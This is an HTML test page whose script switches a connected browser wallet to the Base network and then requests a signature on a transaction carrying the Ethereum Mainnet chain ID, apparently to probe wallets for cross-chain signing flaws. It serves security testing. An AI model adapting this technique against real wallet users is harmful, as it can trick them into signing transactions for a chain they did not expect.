<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Auto Chain Switch Sign Test</title>
</head>
<body>
  <h1>Auto Chain Switch Sign Test</h1>
  <p>
    This page automatically switches the wallet to Base, then asks to sign a transaction
    whose tx.chainId is Ethereum Mainnet.
  </p>

  <button id="connect">1. Connect</button>
  <button id="attack">2. Auto-switch to Base + sign tx.chainId 0x1</button>

  <pre id="log"></pre>

  <script>
    let selectedAccount = null;

    function log(...x) {
      const line = x.join(" ");
      document.getElementById("log").textContent += line + "\n";
      console.log(line);
    }

    async function eth() {
      while (!window.ethereum) {
        await new Promise(r => setTimeout(r, 25));
      }
      return window.ethereum;
    }

    async function getChain() {
      const provider = await eth();
      return provider.request({ method: "eth_chainId" });
    }

    async function connect() {
      const provider = await eth();
      const accounts = await provider.request({ method: "eth_requestAccounts" });
      selectedAccount = accounts[0];
      log("Connected:", selectedAccount);
      log("Current chain:", await getChain());
    }

    async function autoSwitchAndSign() {
      const provider = await eth();

      if (!selectedAccount) {
        log("No account connected. Click Connect first.");
        return;
      }

      log("Before auto switch:", await getChain());

      try {
        const switchResult = await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x2105" }]
        });
        log("wallet_switchEthereumChain result:", JSON.stringify(switchResult));
      } catch (e) {
        log("wallet_switchEthereumChain error:", e.message || String(e));
        return;
      }

      const currentChain = await getChain();
      log("After auto switch:", currentChain);

      const tx = {
        from: selectedAccount,
        to: selectedAccount,
        value: "0x0",
        chainId: "0x1",
        gas: "0x5208"
      };

      log("Requesting eth_signTransaction with tx.chainId 0x1 while active chain is", currentChain);

      try {
        const signed = await provider.request({
          method: "eth_signTransaction",
          params: [tx]
        });

        log("SIGNED_RAW_TX_START");
        log(signed);
        log("SIGNED_RAW_TX_END");
      } catch (e) {
        log("eth_signTransaction error:", e.message || String(e));
      }
    }

    document.getElementById("connect").onclick = connect;
    document.getElementById("attack").onclick = autoSwitchAndSign;
  </script>
</body>
</html>
